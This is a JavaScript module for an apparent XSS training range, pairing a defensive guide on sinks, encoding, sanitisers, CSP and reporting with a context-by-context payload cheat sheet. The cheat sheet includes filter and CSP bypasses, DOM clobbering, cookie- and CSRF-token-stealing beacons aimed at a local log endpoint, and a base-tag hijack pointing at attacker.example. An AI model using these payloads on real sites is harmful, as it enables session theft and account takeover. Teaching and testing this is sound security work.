export const GUIDE = [
  {
    t: 'What XSS actually is',
    p: [
      'XSS is a confusion between data and code inside a parser. Somewhere in the application a string that an attacker controls reaches a parser that treats it as markup or as program text: `innerHTML`, `document.write`, an inline `<script>`, a template engine, `eval`, or a server-rendered template that concatenates instead of encoding.',
      'The type labels (reflected, stored, DOM, blind) describe **delivery and location**, not different bugs. The bug is always the same two-part shape: `source` (where attacker data enters) and `sink` (where it is parsed as code).',
      'That model is the whole reason patchy "strip `<script>`" fixes fail. Fixing XSS means fixing sinks, not blocking suspicious-looking characters.',
    ],
    ul: [
      'Source: query string, path, fragment, body, header, cookie, stored record, postMessage, window.name, localStorage, third-party JSON.',
      'Sink: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, Function, setTimeout(string), location assignment, jQuery $(html)/.html(), srcdoc, template compilation.',
      'Fix: encode at the sink for the exact context, or use an API that cannot parse (textContent, createElement, setAttribute with a validated URL).',
    ],
  },
  {
    t: 'The types, and where each one is fixed',
    p: [
      'Use the taxonomy to reason about who is affected and where the defect lives. Two labs of different "types" can share an identical fix.',
    ],
    ul: [
      '**Reflected**: payload in the request, echoed in the response. Fixed server-side by output encoding; delivery requires a link or a submitted form.',
      '**Stored**: payload persisted (comment, profile, ticket, log, filename) and rendered later, often to a different, more privileged user. Fixed at every render path — which is why second-order bugs survive reviews.',
      '**DOM-based**: source and sink both in client JavaScript. The HTML the server sends is clean, so server-side filters, WAFs and access logs never see the payload. Fixed by safe DOM APIs and validated URL handling.',
      '**Blind**: stored XSS whose sink is in a tool you cannot browse (support desk, log viewer, PDF export). Confirmed with out-of-band callbacks. Fixed like stored XSS, but internal tools need the same rigour as public pages.',
      '**Self-XSS**: the victim executes the payload themselves after social engineering. Not a server-side flaw; mitigated with CSP, HttpOnly cookies, browser paste warnings and user education.',
      '**Mutation / parser-differential (mXSS)**: a sanitiser parses and re-serialises HTML, and the browser re-parses the serialised output differently — recreating markup the sanitiser thought it had removed. Specific payloads depend on browser version, so this range teaches it by principle rather than with a guaranteed-firing lab: never sanitise by regex, and keep your sanitiser (DOMPurify) patched, because its releases are largely mXSS fixes.',
      "**Filter/CSP bypass**: the defence exists but is incomplete — blocklists, single-pass replacements, partial encoding, `script-src 'self'` with a JSONP endpoint, or template sandboxes that can be climbed out of.",
    ],
  },
  {
    t: 'Contexts and their encodings',
    p: [
      'Encoding is only correct for one context. This is the single most common source of "we escaped it but it still works" incidents.',
    ],
    ul: [
      'HTML text (`<p>HERE</p>`): encode `&`, `<`, `>`, `"`, `\'`.',
      'Quoted attribute (`value="HERE"`): encode the above plus the quote you are inside. Never build attributes by concatenation.',
      'Unquoted attribute: not a context — always quote. A space alone starts a new attribute.',
      'URL in an attribute (`href="HERE"`): validate the scheme after parsing with the URL API; allowlist http/https/mailto/relative. Encoding alone does not stop `javascript:`.',
      'JavaScript string (`var x = "HERE"`): do not build source at all. Serialise with JSON and escape `<` as `\\u003c` so `</script>` cannot break out.',
      'CSS: do not interpolate untrusted data; use `element.style` properties with a numeric/allowlist check.',
      'Markdown/rich text: convert to HTML, then run the output through an allow-list sanitiser, then validate links.',
    ],
  },
  {
    t: 'Sanitisers: allow-lists, not blocklists',
    p: [
      'A sanitiser must parse HTML into a tree and rebuild it from an allow-list of elements and attributes. Regex replacement over strings is not a sanitiser: single-pass replacement can be tricked into rebuilding the tag it deleted (see the nested-tag lab).',
      'DOMPurify is the de-facto default. Configure it narrowly, keep it updated, and remember it protects markup — not URL schemes you then re-introduce.',
    ],
    ul: [
      'Allow the smallest set of tags and attributes the feature needs.',
      'Disable data attributes if you do not need them, and strip `id`/`name` where DOM clobbering matters.',
      'Validate link schemes after sanitising, because `href` survives most sanitisers.',
      'Never sanitise for one context and render into another (for example sanitise as HTML then interpolate into JavaScript).',
    ],
  },
  {
    t: 'CSP as defence in depth (and its limits)',
    p: [
      'Content-Security-Policy does not fix XSS; it limits what a successful payload can do. It is still the highest-value second layer because it turns many XSS bugs into harmless HTML injection.',
    ],
    ul: [
      'Use nonces or hashes with `strict-dynamic` rather than host allowlists; host allowlists are routinely bypassed by JSONP, open redirects and self-hosted JS gadgets.',
      'Add `object-src \'none\'`, `base-uri \'none\'`, `frame-ancestors \'none\'`, and restrict `connect-src` and `img-src` so exfiltration channels are closed.',
      'Roll out in report-only mode first, then enforce; keep a reporting endpoint.',
      'Remove JSONP endpoints, `unsafe-inline`, `unsafe-eval` and wildcard subdomains before you trust the policy.',
    ],
  },
  {
    t: 'Sessions: make a successful payload worth less',
    p: [
      'If a payload cannot read a credential and cannot phone home, the impact collapses from account takeover to defacement.',
    ],
    ul: [
      'Session cookies: `HttpOnly`, `Secure`, `SameSite=Lax` or `Strict`, `__Host-` prefix, short lifetime.',
      'Do not put tokens in localStorage — any XSS can read it. Prefer HttpOnly cookies with CSRF tokens.',
      'Bind sessions to client characteristics where you can do it without breaking users, and rotate on privilege change.',
      'Add Trusted Types (`require-trusted-types-for \'script\'`) where the stack supports it: it turns DOM sinks into reviewed sinks.',
    ],
  },
  {
    t: 'How to test, methodically',
    p: [
      'Random fuzzing finds noise; context mapping finds bugs. Work source to sink or sink to source, and always identify the parser before choosing a payload.',
    ],
    ul: [
      'Send a unique canary (for example `xss7f3a`) into every input, then search the response, the DOM and the JavaScript for it.',
      'Note exactly where it lands: text, attribute, script, URL, JSON, or nowhere visible (suspect blind).',
      'Craft for that context: quote break for attributes, `\';` for JS strings, `javascript:` for URL sinks, tags for HTML text.',
      'For DOM flows, set a breakpoint or log the value at the sink; confirm the source is attacker-reachable without a proxy rewriting anything.',
      'For blind flows, use out-of-band callbacks (this range uses its own `/api/attack/log` console). Never point payloads at third-party infrastructure you do not own.',
      'Verify impact, not alerts. `alert(document.domain)` proves execution; then show what that execution can reach — session, CSRF token, privileged action.',
    ],
  },
  {
    t: 'Reporting and remediation',
    p: [
      'A good XSS report names the source, the sink, the parser and the impact, and it reproduces without a proxy. "Alert box appears" is not an impact statement.',
    ],
    ul: [
      'Minimal reproducible request or URL, plus the exact context the payload lands in.',
      'Precondition and privilege required (anonymous, user, agent, admin) and who else is affected (stored payloads affect others).',
      'Impact chain: what the payload read or did, with a screenshot or console capture.',
      'Fix at the sink with the correct encoder, plus the second layer (CSP, HttpOnly, sanitiser) that would have contained it.',
      'Add a regression test: assert that the payload appears encoded in the response or is inert in the DOM.',
    ],
  },
];

export const CHEATSHEET = [
  {
    t: 'HTML text context',
    d: 'Your value lands between tags. The parser builds elements for you.',
    items: [
      { label: 'Script tag', code: '<script>alert(document.domain)</script>' },
      { label: 'Broken image', code: '<img src=x onerror=alert(document.domain)>' },
      { label: 'SVG load', code: '<svg onload=alert(document.domain)>' },
      { label: 'No interaction, no img', code: '<details open ontoggle=alert(document.domain)>' },
      { label: 'Iframe srcdoc', code: '<iframe srcdoc="<script>alert(document.domain)</script>">' },
    ],
  },
  {
    t: 'Attribute context',
    d: 'Break the quote, then add an attribute. Angle brackets are often filtered here — a quote is what matters.',
    items: [
      { label: 'Double-quoted value', code: '" autofocus onfocus="alert(document.domain)' },
      { label: 'Single-quoted value', code: "' autofocus onfocus='alert(document.domain)" },
      { label: 'Unquoted value (space ends it)', code: 'x onmouseover=alert(document.domain)' },
      { label: 'Escape the tag entirely', code: '"><svg onload=alert(document.domain)>' },
    ],
  },
  {
    t: 'JavaScript string context',
    d: 'You are inside source code, not HTML. Use the JS parser: quotes, backticks, backslashes and line terminators.',
    items: [
      { label: 'Single-quoted string', code: "';alert(document.domain);//" },
      { label: 'Double-quoted string', code: '";alert(document.domain);//' },
      { label: 'Template literal', code: '${alert(document.domain)}' },
      { label: 'Closing the script element', code: '</script><script>alert(document.domain)</script>' },
    ],
  },
  {
    t: 'URL / href context',
    d: 'Scheme validation must happen after parsing. Encoding does not stop javascript:',
    items: [
      { label: 'Direct', code: 'javascript:alert(document.domain)' },
      { label: 'Tab inside the scheme (entity)', code: 'java&#9;script:alert(document.domain)' },
      { label: 'Newline inside the scheme', code: 'java&#10;script:alert(document.domain)' },
      { label: 'Base tag hijack', code: '<base href="https://attacker.example/">' },
    ],
  },
  {
    t: 'DOM sinks',
    d: 'Sources: location, document.referrer, window.name, postMessage, storage, JSON APIs, third-party scripts.',
    items: [
      { label: 'innerHTML', code: 'el.innerHTML = location.search.slice(1)' },
      { label: 'document.write', code: 'document.write(location.hash.slice(1))' },
      { label: 'eval / Function', code: '#alert(document.domain)' },
      { label: 'setTimeout string', code: 'setTimeout(location.hash.slice(1), 0)' },
      { label: 'jQuery selector', code: '$("<img src=x onerror=alert(document.domain)>")' },
      { label: 'postMessage with no origin check', code: "target.postMessage('<img src=x onerror=alert(1)>','*')" },
      { label: 'DOM clobbering', code: '<a id="config"><a id="config" name="url" href="javascript:alert(1)">' },
    ],
  },
  {
    t: 'Filter and sanitiser bypass ideas',
    d: 'Only against systems you are authorised to test. Every row here maps to a lab in this range.',
    items: [
      { label: 'Tag blocklist', code: '<img src=x onerror=alert(document.domain)>' },
      { label: 'Nested tag rebuild', code: '<scr<script>ipt>alert(document.domain)</scr</script>ipt>' },
      { label: 'Case and whitespace', code: '<IMG SRC=x OnErRoR=alert(document.domain)>' },
      { label: 'CSP with JSONP gadget', code: '<script src="/api/jsonp?cb=alert"></script>' },
      { label: 'CSTI / template expression', code: '{{constructor.constructor("alert(1)")()}}' },
      { label: 'Encoding the payload inside a URL', code: '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' },
    ],
  },
  {
    t: 'Exfiltration (what a real payload does)',
    d: 'In this range, callbacks go to the site\'s own console: /api/attack/log?lab=<id>&src=<label>&d=<data>.',
    items: [
      { label: 'Read the session', code: "fetch('/api/attack/log?lab=LAB&src=x&d='+encodeURIComponent(document.cookie))" },
      { label: 'Read the page context', code: "fetch('/api/attack/log?lab=LAB&src=page&d='+encodeURIComponent(location.href))" },
      { label: 'Grab a CSRF token from the DOM', code: "fetch('/api/attack/log?lab=LAB&src=csrf&d='+encodeURIComponent(document.querySelector('input[name=csrf]').value))" },
      { label: 'Image beacon (no fetch)', code: "new Image().src='/api/attack/log?lab=LAB&src=img&d='+encodeURIComponent(document.cookie)" },
    ],
  },
  {
    t: 'Encoding reference',
    d: 'Most "bypasses" are just the right character in the right context.',
    items: [
      { label: 'HTML entities', code: '& → &amp;   < → &lt;   > → &gt;   " → &quot;   \' → &#39;' },
      { label: 'URL encoding', code: '< → %3C   > → %3E   " → %22   space → %20   # → %23' },
      { label: 'JS string escapes', code: String.raw`\'  \"  \\  \u003c  \u003e  \n  \r` },
      { label: 'Double encoding (when the app decodes twice)', code: '%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E' },
    ],
  },
];
